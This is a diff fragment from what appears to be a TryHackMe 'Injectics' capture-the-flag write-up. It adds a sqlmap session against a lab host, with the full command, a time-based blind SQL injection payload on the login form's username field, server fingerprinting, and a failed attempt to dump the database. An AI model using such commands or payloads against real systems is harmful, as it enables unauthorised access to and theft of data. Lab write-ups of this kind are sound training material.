@@ -88,6 +88,53 @@ Dev Team
 dev@injectics.thm
 
 
+┌──(kali㉿kali)-[~/Documents/THM/THM_Injectics]
+└─$ sqlmap -r reg1.txt --level 5 --risk=3 --dump     
+        ___
+       __H__                                                                                                        
+ ___ ___["]_____ ___ ___  {1.8.11#stable}                                                                           
+|_ -| . [(]     | .'| . |                                                                                           
+|___|_  [)]_|_|_|__,|  _|                                                                                           
+      |_|V...       |_|   https://sqlmap.org                                                                        
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:15:11 /2025-01-16/
+
+[09:15:11] [INFO] parsing HTTP request from 'reg1.txt'
+[09:15:11] [INFO] resuming back-end DBMS 'mysql' 
+[09:15:11] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 RLIKE time-based blind
+    Payload: username=10.10.9.71' RLIKE SLEEP(5)-- hcXN&password=10.10.9.71&function=login
+---
+[09:15:11] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.0.12
+[09:15:11] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[09:15:11] [INFO] fetching current database
+[09:15:11] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
+[09:15:13] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+
+[09:15:13] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[09:15:13] [INFO] fetching database names
+[09:15:13] [INFO] fetching number of databases
+[09:15:13] [INFO] retrieved: 
+[09:15:13] [ERROR] unable to retrieve the number of databases
+[09:15:13] [INFO] falling back to current database
+[09:15:13] [INFO] fetching current database
+[09:15:13] [INFO] retrieved: 
+[09:15:14] [CRITICAL] unable to retrieve the database names
+[09:15:14] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.9.71'
+
+
+
+
+
 
   
 <\code>
